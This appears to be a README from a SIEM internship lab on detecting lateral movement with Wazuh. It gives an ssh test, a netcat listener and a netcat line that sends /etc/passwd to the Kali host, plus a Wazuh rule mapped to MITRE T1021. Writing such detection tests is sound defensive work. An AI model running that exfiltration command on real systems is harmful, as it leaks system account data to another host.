# Lateral Movement Detection (SSH/Rsync)
**Simulate from Ubuntu to another Linux box (or back to Kali):**

    ssh user@<kali-ip>

**Or simulate with netcat:**

nc -lvnp 2222     # on Kali

nc <kali-ip> 2222 < /etc/passwd   # on Ubuntu
________________________________________
**Wazuh rule:**

    <rule id="101300" level="12">
      <match>sshd</match>
      <description>Remote connection - possible lateral movement via SSH</description>
      <mitre>
        <id>T1021</id>
      </mitre>
    </rule>

Monitor /var/log/auth.log for SSH outbound logins.
________________________________________


# Proof-Of-Concept

![Lateral Movement Detection](https://github.com/Gagancybersec01/SIEM-Internship-Phase-1/blob/b6063da8c0f9dd21fbacfedd79c372ad59d27606/Screenshots/Lateral-movement-Detection.png)





